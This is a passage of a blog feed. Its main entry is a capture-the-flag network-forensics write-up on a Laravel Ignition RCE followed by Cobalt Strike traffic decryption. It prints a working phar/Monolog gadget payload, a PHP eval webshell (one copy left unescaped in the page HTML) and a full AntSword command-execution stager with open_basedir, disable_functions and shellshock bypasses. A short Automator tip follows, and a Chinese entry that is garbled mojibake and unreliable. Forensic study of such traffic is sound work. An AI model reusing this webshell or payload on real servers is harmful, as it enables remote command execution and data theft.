#x3D;00i&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00j&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00o&#x3D;00i&#x3D;00Y&#x3D;003&#x3D;00V&#x3D;00y&#x3D;00c&#x3D;00m&#x3D;00V&#x3D;00u&#x3D;00d&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00j&#x3D;00o&#x3D;00i&#x3D;00c&#x3D;003&#x3D;00l&#x3D;00z&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00t&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;009&#x3D;00f&#x3D;00X&#x3D;001&#x3D;00p&#x3D;00O&#x3D;00j&#x3D;00c&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;003&#x3D;00O&#x3D;003&#x3D;000&#x3D;00F&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00Z&#x3D;00H&#x3D;00V&#x3D;00t&#x3D;00b&#x3D;00X&#x3D;00k&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00X&#x3D;00E&#x3D;00t&#x3D;00L&#x3D;00Y&#x3D;00Q&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00M&#x3D;00f&#x3D;00n&#x3D;00&#x2F;&#x3D;00Y&#x3D;00t&#x3D;00g&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00I&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00z&#x3D;00d&#x3D;00C&#x3D;005&#x3D;000&#x3D;00e&#x3D;00H&#x3D;00Q&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00X&#x3D;00E&#x3D;00t&#x3D;00L&#x3D;00Y&#x3D;00Q&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00M&#x3D;00f&#x3D;00n&#x3D;00&#x2F;&#x3D;00Y&#x3D;00t&#x3D;00g&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;000&#x3D;00Z&#x3D;00X&#x3D;00N&#x3D;000&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00z&#x3D;00d&#x3D;00D&#x3D;00Z&#x3D;006&#x3D;00P&#x3D;00U&#x3D;00p&#x3D;00j&#x3D;00h&#x3D;00k&#x3D;00a&#x3D;00y&#x3D;00y&#x3D;00N&#x3D;00i&#x3D;00Q&#x3D;003&#x3D;00Y&#x3D;00w&#x3D;00m&#x3D;00f&#x3D;00p&#x3D;00c&#x3D;008&#x3D;00Q&#x3D;00J&#x3D;00n&#x3D;00s&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00E&#x3D;00d&#x3D;00C&#x3D;00T&#x3D;00U&#x3D;00I&#x3D;00&#x3D;00</span><br></pre></td></tr></table></figure><p>Replacing =00 to null then base64 decode it, we can get the webshell contents.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php __HALT_COMPILER(); ?&gt;</span><br><span class="line">ï¿½a:2:&#123;i:7;O:32:&quot;Monolog\Handler\SyslogUdpHandler&quot;:1:&#123;s:9:&quot;*socket&quot;;O:29:&quot;Monolog\Handler\BufferHandler&quot;:7:&#123;s:10:&quot;*handler&quot;;r:3;s:13:&quot;*bufferSize&quot;;i:-1;s:9:&quot;*buffer&quot;;a:1:&#123;i:0;a:2:&#123;i:0;s:77:&quot;echo ^&lt;?php @eval(@gzinflate(base64_decode($_POST[14433])));?^&gt; &gt; .config.php&quot;;s:5:&quot;level&quot;;N;&#125;&#125;s:8:&quot;*level&quot;;N;s:14:&quot;*initialized&quot;;b:1;s:14:&quot;*bufferLimit&quot;;i:-1;s:13:&quot;*processors&quot;;a:2:&#123;i:0;s:7:&quot;current&quot;;i:1;s:6:&quot;system&quot;;&#125;&#125;&#125;i:7;i:7;&#125;dummy\KKa~Ø¶test.txt\KKa~Ø¶testtest6z&#x3D;Jcï¿½Fï¿½ï¿½ØİŒ&amp;~ï¿½&lt;@ï¿½ï¿½GBMB</span><br></pre></td></tr></table></figure><?php @eval(@gzinflate(base64_decode($_POST[14433])));?><p> are webshell.We can decode traffic after base64 and gzip decode.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">14433&#x3D;c0gtS8zRcEivysxLy0ksSdVISixONTOJT0lNzk9J1VCJD&#x2F;APDomON6gwSDFJNUpJNUs2TEs0j9XU1LQGAA&#x3D;&#x3D;</span><br><span class="line">_0x0d4e2de6c1fa7&#x3D;jVZtT9tIEP5+v2JZWcRWTZy3o5Q9U6MqVSvRAxF0fCiV5dhrsodjW7sOgUv8329m&#x2F;ZYA1ysI5JmdeXbeZz2RCl&#x2F;xwqSRUHkSPPtcykwqahM6oBbz4MwvxJL7iViKwhxYzMjySEjXQ8171MxynvrzQHFgg4qIzUrEIhsjC9eRC99psOSm4c+m139Nr7&#x2F;T2afrr1c3&#x2F;uevF9M&#x2F;z79N6Q8NG0jp5pLf+2AJ3EUdtj11qF2jMQ&#x2F;OwcB8pRZmJW1rfFs9K7TEL&#x2F;gy90HUtCwWZ5IHYSNIAkUMAedgE9h34Anlr6UognkCZukDaxNmaSHSFWclM4ol+qhP+tTpxzyKhpR5yweEr061pwdeLBLu8yehCtUc7EJ54WJXxWvjvRc1iHa&#x2F;D7EzwrTAKHh7YbiDn+2dg6GoYcA7MNsdMEP8ocQ&#x2F;PIOYV6qAId69szb1vRVs+Z&#x2F;3UgeTLJe7Ns4hcg+gUzIWr9KwEFkK8eNpCMFcFdZG8mIlU4IEyOyIACNfFaa1MaovN5vrvGA0eArxsRhweBr5YcKDFEgeLjJCx8e0TyfxiFa0110GII3QZARCcQxZKAFEga9wEyvk88bIXfTneOJHPMwibqrVXBXgj391Obv5TuOT42E0&#x2F;jAZvh+MJhP6wx5BfRjq50qreB6Nx7+fjE7i8SBulHj6CEKu91PV+WQ8mI+Hg5PxSfBh3Kj+ahuEbgMX2QN7aLku5OgjPQrJHd0Yqryj9JQ6OxSW4RsqUAIQPTDYpFfnN19c2odUtCS1+vTUWSnpJFkYJI6ai3SXbsnuQH9UJPzDquKJ4v97C&#x2F;t06tyKNMrWyoFGhYYaj3Z5s2d1e3l7PNnhvTjWKg3jKltzOVvwJHEeh&#x2F;2Bw9AQbETo&#x2F;eLZrDMELYhf2Er8KU8wSXS73QYqESmHD2i4RrKbFJWCHhWPek6QFvXRAkbjKWj5ksOwDBvUB&#x2F;5cgVIXkUGalWVpSBdylJcwBsOSdo0SQwnEYGDU2WZTu5unMIlxLvmNgqKWnjW1LZGldfUwNJssNAx&#x2F;GeRmr5Bi2bN3GGBykSUYup6NAKysmths7mgnWGwdHsJwhBpIquGIjAOR+tV9Rlzrd+7IVaowH2qRhQ9YgsQI6&#x2F;B1ZUkGNhlaxHUJlCY5PMQg9Kp49iykTWTo3eMn2T3wtlstswxE0rOsBrCQCAgJiyCTDzAboRQdtaAWxB6aEj7IgUs+n1&#x2F;Mprh+imVOXIJ7ATrPfL0nbNILVM9ibQ1&#x2F;ufIvLi9cE5TJEyMlA2fImcYZnR0O9Xp7ZSsIt5RJA4quspJgYsgGHQCmNxy97w&#x2F;gd4hl0vwdzR+xfhvZerJ+DoBiZT0AwYFqyeyNUjQJJvcq1XGoKDStUYIoUAjGJpciLbpZWt9wI3E3lfv37aU0XEawUqDSQAb3zC+OLyhTDE7V6BCZjVd9ApaNUHW91mJ5oFSxkCst2BBvi+oSgyrlIQpXXnkdE23dV2hEvfoY3go1bKX8dyZSk&#x2F;6Gz4sXmjmuSFQ14hw2MVKo35NQKOsFZAK3vl65cd7ZEkN6sH9yezSYnCCkl4dJprgW279AZqHfXoIV6rUsvIlUvTYk7ln92ctFzntQrese1Ozo7QM4MUT20kaRfR&#x2F;+eGWm5raWvtIYvakx6jS8uPatgme79Ahp7VDNe+F+APXb1UdLYQpbuTeHitV2CCayld1ffgduPWG8MIGKagYb&#x2F;XT5jWK4127K1wQos3c7C6XIi76+qYfr3TXWR2dNPcEbIXMNfnQ2K6JLfNcwvLbvAvvo7BpG0HmSIFPxRmoq5Y4U35Wq+7Cra91ZkHqYC800rt3SAK7XNKHs02b2aBCiUQ7cgfWRoqAGKuFRQBkrw6CAVTZ9CnmuO9ng1qZ6P02vry+vT+ER2UdjIaffuFLBPccVwrq3G4sEsv4F</span><br><span class="line">b430b310838a93&#x3D;4g</span><br><span class="line">f861d394170244&#x3D;X4Y21k</span><br><span class="line">ufbd335828f30f&#x3D;0bY2QgL2QgIkQ6XFxwaHBzdHVkeV9wcm9cXFdXV1xcc2VjcmV0IiYiQzpcUHJvZ3JhbSBGaWxlc1w3LVppcFw3ei5leGUiIHggc2VjcmV0LnppcCAtcFA0VWs2cWtoNkd2cXdnM3kmZWNobyAzNzhkZjJjMjM0JmNkJmVjaG8gZmI3Zjhm</span><br></pre></td></tr></table></figure><p>Above encryped data are webshell commands which executing extract zip file,decode it with base64 and gzip, we can get the source code of server send to client.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;, &quot;0&quot;);</span><br><span class="line">@set_time_limit(0);</span><br><span class="line">$opdir&#x3D;@ini_get(&quot;open_basedir&quot;);</span><br><span class="line">if($opdir) &#123;</span><br><span class="line">$ocwd&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">$oparr&#x3D;preg_split(&quot;&#x2F;;|:&#x2F;&quot;,$opdir);</span><br><span class="line">@array_push($oparr,$ocwd,sys_get_temp_dir());</span><br><span class="line">foreach($oparr as $item) &#123;</span><br><span class="line">if(!@is_writable($item)) &#123;</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">$tmdir&#x3D;$item.&quot;&#x2F;.fedd1&quot;;</span><br><span class="line">@mkdir($tmdir);</span><br><span class="line">if(!@file_exists($tmdir)) &#123;</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br><span class="line">@chdir($tmdir);</span><br><span class="line">@ini_set(&quot;open_basedir&quot;, &quot;..&quot;);</span><br><span class="line">$cntarr&#x3D;@preg_split(&quot;&#x2F;\\\\|\&#x2F;&#x2F;&quot;,$tmdir);</span><br><span class="line">for ($i&#x3D;0;$i&lt;sizeof($cntarr);$i++) &#123;</span><br><span class="line">@chdir(&quot;..&quot;);</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">@ini_set(&quot;open_basedir&quot;,&quot;&#x2F;&quot;);</span><br><span class="line">@rmdir($tmdir);</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">;</span><br><span class="line">function asenc($out) &#123;</span><br><span class="line">return $out;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">function asoutput() &#123;</span><br><span class="line">$output&#x3D;ob_get_contents();</span><br><span class="line">ob_end_clean();</span><br><span class="line">echo &quot;36&quot;.&quot;4f2&quot;;</span><br><span class="line">echo @asenc($output);</span><br><span class="line">echo &quot;42&quot;.&quot;ff1&quot;;</span><br><span class="line">&#125;</span><br><span class="line">ob_start();</span><br><span class="line">try &#123;</span><br><span class="line">$p&#x3D;base64_decode(substr($_POST[&quot;f861d394170244&quot;],2));</span><br><span class="line">$s&#x3D;base64_decode(substr($_POST[&quot;ufbd335828f30f&quot;],2));</span><br><span class="line">$envstr&#x3D;@base64_decode(substr($_POST[&quot;b430b310838a93&quot;],2));</span><br><span class="line">$d&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">$c&#x3D;substr($d,0,1)&#x3D;&#x3D;&quot;&#x2F;&quot;?&quot;-c \&quot;&#123;$s&#125;\&quot;&quot;:&quot;&#x2F;c \&quot;&#123;$s&#125;\&quot;&quot;;</span><br><span class="line">if(substr($d,0,1)&#x3D;&#x3D;&quot;&#x2F;&quot;) &#123;</span><br><span class="line">@putenv(&quot;PATH&#x3D;&quot;.getenv(&quot;PATH&quot;).&quot;:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">@putenv(&quot;PATH&#x3D;&quot;.getenv(&quot;PATH&quot;).&quot;;C:&#x2F;Windows&#x2F;system32;C:&#x2F;Windows&#x2F;SysWOW64;C:&#x2F;Windows;C:&#x2F;Windows&#x2F;System32&#x2F;WindowsPowerShell&#x2F;v1.0&#x2F;;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if(!empty($envstr)) &#123;</span><br><span class="line">$envarr&#x3D;explode(&quot;|||asline|||&quot;, $envstr);</span><br><span class="line">foreach($envarr as $v) &#123;</span><br><span class="line">if (!empty($v)) &#123;</span><br><span class="line">@putenv(str_replace(&quot;|||askey|||&quot;, &quot;&#x3D;&quot;, $v));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$r&#x3D;&quot;&#123;$p&#125; &#123;$c&#125;&quot;;</span><br><span class="line">function fe($f) &#123;</span><br><span class="line">$d&#x3D;explode(&quot;,&quot;,@ini_get(&quot;disable_functions&quot;));</span><br><span class="line">if(empty($d)) &#123;</span><br><span class="line">$d&#x3D;array();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$d&#x3D;array_map(&#39;trim&#39;,array_map(&#39;strtolower&#39;,$d));</span><br><span class="line">&#125;</span><br><span class="line">return(function_exists($f)&amp;&amp;is_callable($f)&amp;&amp;!in_array($f,$d));</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">function runshellshock($d, $c) &#123;</span><br><span class="line">if (substr($d, 0, 1) &#x3D;&#x3D; &quot;&#x2F;&quot; &amp;&amp; fe(&#39;putenv&#39;) &amp;&amp; (fe(&#39;error_log&#39;) || fe(&#39;mail&#39;))) &#123;</span><br><span class="line">if (strstr(readlink(&quot;&#x2F;bin&#x2F;sh&quot;), &quot;bash&quot;) !&#x3D; FALSE) &#123;</span><br><span class="line">$tmp &#x3D; tempnam(sys_get_temp_dir(), &#39;as&#39;);</span><br><span class="line">putenv(&quot;PHP_LOL&#x3D;() &#123; x; &#125;; $c &gt;$tmp 2&gt;&amp;1&quot;);</span><br><span class="line">if (fe(&#39;error_log&#39;)) &#123;</span><br><span class="line">error_log(&quot;a&quot;, 1);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">mail(&quot;a@127.0.0.1&quot;, &quot;&quot;, &quot;&quot;, &quot;-bv&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">return False;</span><br><span class="line">&#125;</span><br><span class="line">$output &#x3D; @file_get_contents($tmp);</span><br><span class="line">@unlink($tmp);</span><br><span class="line">if ($output !&#x3D; &quot;&quot;) &#123;</span><br><span class="line">print($output);</span><br><span class="line">return True;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return False;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">function runcmd($c) &#123;</span><br><span class="line">$ret&#x3D;0;</span><br><span class="line">$d&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">if(fe(&#39;system&#39;)) &#123;</span><br><span class="line">@system($c,$ret);</span><br><span class="line">&#125; elseif(fe(&#39;passthru&#39;)) &#123;</span><br><span class="line">@passthru($c,$ret);</span><br><span class="line">&#125; elseif(fe(&#39;shell_exec&#39;)) &#123;</span><br><span class="line">print(@shell_exec($c));</span><br><span class="line">&#125; elseif(fe(&#39;exec&#39;)) &#123;</span><br><span class="line">@exec($c,$o,$ret);</span><br><span class="line">print(join(&quot;</span><br><span class="line">&quot;,$o));</span><br><span class="line">&#125; elseif(fe(&#39;popen&#39;)) &#123;</span><br><span class="line">$fp&#x3D;@popen($c,&#39;r&#39;);</span><br><span class="line">while(!@feof($fp)) &#123;</span><br><span class="line">print(@fgets($fp,2048));</span><br><span class="line">&#125;</span><br><span class="line">@pclose($fp);</span><br><span class="line">&#125; elseif(fe(&#39;proc_open&#39;)) &#123;</span><br><span class="line">$p &#x3D; @proc_open($c, array(1 &#x3D;&gt; array(&#39;pipe&#39;, &#39;w&#39;), 2 &#x3D;&gt; array(&#39;pipe&#39;, &#39;w&#39;)), $io);</span><br><span class="line">while(!@feof($io[1])) &#123;</span><br><span class="line">print(@fgets($io[1],2048));</span><br><span class="line">&#125;</span><br><span class="line">while(!@feof($io[2])) &#123;</span><br><span class="line">print(@fgets($io[2],2048));</span><br><span class="line">&#125;</span><br><span class="line">@fclose($io[1]);</span><br><span class="line">@fclose($io[2]);</span><br><span class="line">@proc_close($p);</span><br><span class="line">&#125; elseif(fe(&#39;antsystem&#39;)) &#123;</span><br><span class="line">@antsystem($c);</span><br><span class="line">&#125; elseif(runshellshock($d, $c)) &#123;</span><br><span class="line">return $ret;</span><br><span class="line">&#125; elseif(substr($d,0,1)!&#x3D;&quot;&#x2F;&quot; &amp;&amp; @class_exists(&quot;COM&quot;)) &#123;</span><br><span class="line">$w&#x3D;new COM(&#39;WScript.shell&#39;);</span><br><span class="line">$e&#x3D;$w-&gt;exec($c);</span><br><span class="line">$so&#x3D;$e-&gt;StdOut();</span><br><span class="line">$ret.&#x3D;$so-&gt;ReadAll();</span><br><span class="line">$se&#x3D;$e-&gt;StdErr();</span><br><span class="line">$ret.&#x3D;$se-&gt;ReadAll();</span><br><span class="line">print($ret);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$ret &#x3D; 127;</span><br><span class="line">&#125;</span><br><span class="line">return $ret;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">$ret&#x3D;@runcmd($r.&quot; 2&gt;&amp;1&quot;);</span><br><span class="line">print ($ret!&#x3D;0)?&quot;ret&#x3D;&#123;$ret&#125;&quot;:&quot;&quot;;</span><br><span class="line">;</span><br><span class="line">&#125;</span><br><span class="line">catch(Exception $e) &#123;</span><br><span class="line">echo &quot;ERROR:&#x2F;&#x2F;&quot;.$e-&gt;getMessage();</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">asoutput();</span><br><span class="line">die();</span><br></pre></td></tr></table></figure><p>We can see that parameter s receive  parameter ufbd335828f30fâ€™s value.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$s&#x3D;base64_decode(substr($_POST[&quot;ufbd335828f30f&quot;],2));</span><br></pre></td></tr></table></figure><p>so, s=</p><figure class="highlight plain"><figcaption><span>/d "D:\\phpstudy_pro\\WWW\\secret"&"C:\Program Files\7-Zip\7z.exe" x secret.zip -pP4Uk6qkh6Gvqwg3y&echo 378df2c234&cd&echo fb7f8f</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>The password was found,P4Uk6qkh6Gvqwg3y.Then extract beacon_keys file.We can recover serialized private key by  <a href="https://github.com/WBGlIl/CS_Decrypt">https://github.com/WBGlIl/CS_Decrypt</a>.</p><p><img src="http://cdn.polowong.top/1633578377113neqkckzh.png?imageslim" alt="paste image"></p><p>From RSA key we can recover AES key in traffic ,usually the encryped data located in cookie field.</p><p><img src="http://cdn.polowong.top/1633578510720pypykjsw.png?imageslim" alt="paste image"><img src="http://cdn.polowong.top/16336126404051wc58fdp.png?imageslim" alt="paste image"></p><p>From AES key we can recover totally communication contents,according to cobalt strike traffic characetristics,we can get beaconâ€™s task execution results from the pacakage which POST DATA to submit.php?id=xxx.</p><p><img src="http://cdn.polowong.top/163361286315319q01mf9.png?imageslim" alt="paste image"></p><p>Note that data should be base64 format,then use script decode it.</p><p><img src="http://cdn.polowong.top/1633612982627c0it3dfp.png?imageslim" alt="paste image"></p><p>So beaconâ€™s task execution result were shown in above figure, it contains the flag what we want.</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://blog.csdn.net/qq_43264813/article/details/120560209">https://blog.csdn.net/qq_43264813/article/details/120560209</a></p><p><a href="https://wbglil.gitbook.io/cobalt-strike/cobalt-strike-yuan-li-jie-shao/cs-mu-biao-shang-xian-guo-cheng#beacon-shu-ju-hui-chuan">https://wbglil.gitbook.io/cobalt-strike/cobalt-strike-yuan-li-jie-shao/cs-mu-biao-shang-xian-guo-cheng#beacon-shu-ju-hui-chuan</a></p><p><a href="https://www.wkr.moe/ctf/610.html#toc-head-3">https://www.wkr.moe/ctf/610.html#toc-head-3</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Quick start  Captfencoder in Mac</title>
      <link href="2021/10/08/Quick-start-Captfencoder-in-Mac/"/>
      <url>2021/10/08/Quick-start-Captfencoder-in-Mac/</url>
      
        <content type="html"><![CDATA[<h1 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h1><p>Automator in mac<br>open automator,choose application,search shell on the top<br><img src="http://cdn.polowong.top/1633678583273wpowfu9o.png?imageslim" alt="paste image"><br>then type</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH&#x3D;$PATH:&#x2F;path&#x2F;to&#x2F;npm&#x2F;;cd &#x2F;path&#x2F;to&#x2F;npm&#x2F;apps ;npm start</span><br></pre></td></tr></table></figure><p>Automator doesnâ€™t know the path of npm, so it should be exported frist.<br><img src="http://cdn.polowong.top/1633678772412ykmrga69.png?imageslim" alt="paste image"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ç»¿åŸæ¯æµé‡åˆ†æ</title>
      <link href="2021/10/07/%E7%BB%BF%E5%9F%8E%E6%9D%AF%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
      <url>2021/10/07/%E7%BB%BF%E5%9F%8E%E6%9D%AF%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>è¿™é¢˜æŒºæœ‰æ„æ€çš„ï¼Œè¿˜æ˜¯æŒ‰æµé‡åˆ†æçš„æ€è·¯æ¥åšï¼Œä¸ªäººä¹ æƒ¯å…ˆçœ‹poståŒ…<img src="http://cdn.polowong.top/1633574050565kc7miz95.png?imageslim" alt="paste image">åœ¨è¿™é‡Œçœ‹åˆ°äº†å¾ˆå¤šignitionä¹‹ç±»çš„åŒ…ï¼Œç™¾åº¦äº†ä¸‹è¿™æ˜¯ä¸€ä¸ªlaravelçš„RCEã€‚åé¢çš„åŒ…ä¸€ç›´åœ¨å‘.config.php postæ•°æ®ï¼Œæ€€ç–‘config.phpæ˜¯å†™çš„é©¬ï¼Œè·Ÿè¿›å»çœ‹çœ‹ã€‚ä½¿ç”¨http contains configè¿‡æ»¤å‡ºæ¥ã€‚<img src="http://cdn.polowong.top/16335741885165rs7bwkh.png?imageslim" alt="paste image">å¾ˆæ˜æ˜¾æ˜¯webshelläº†ï¼Œè¿™æ˜¯åœ¨æ‰§è¡Œls<img src="http://cdn.polowong.top/1633574233022a3e3z8xv.png?imageslim" alt="paste image">ç»§ç»­è·Ÿè¸ªè¿™ä¸ªwebshellçš„æ•°æ®åŒ…ï¼Œçœ‹çœ‹æœ‰æ— æœ‰ä»·å€¼çš„ä¿¡æ¯ã€‚<img src="http://cdn.polowong.top/1633574349937r8r9xs6k.png?imageslim" alt="paste image">çœ‹åˆ°äº†ä¸€ä¸ªsecret.zipï¼Œä½†æ˜¯httpå¯¹è±¡å¯¼å‡ºå¹¶æ²¡æœ‰è¿™ç©æ„ã€‚ç»§ç»­è¿½è¸ªçœ‹åˆ°äº†pkå¼€å¤´çš„ä¸€æ®µæ•°æ®ï¼Œè€ƒè™‘æ˜¯å‹ç¼©åŒ…ï¼Œå°è¯•è¿›è¡Œè¿˜åŸã€‚<img src="http://cdn.polowong.top/16335744113565ygjm6if.png?imageslim" alt="paste image">éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå‹ç¼©åŒ…å‰åæœ‰ä¸¤æ®µå­—ç¬¦ä¸²æ˜¯èšå‰‘è‡ªå¸¦å¹²æ‰°æµé‡ç‰¹å¾çš„ã€‚è¿˜åŸä¹‹åæ˜¯ä¸ªåŠ å¯†çš„å‹ç¼©åŒ…ï¼Œä¸æ˜¯ä¼ªåŠ å¯†ï¼Œä¸‹ä¸€æ­¥çš„ç›®çš„æ˜¯æ‰¾åˆ°å‹ç¼©åŒ…çš„å¯†ç ã€‚åŒæ—¶éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œæ–‡ä»¶åå’Œcobalt 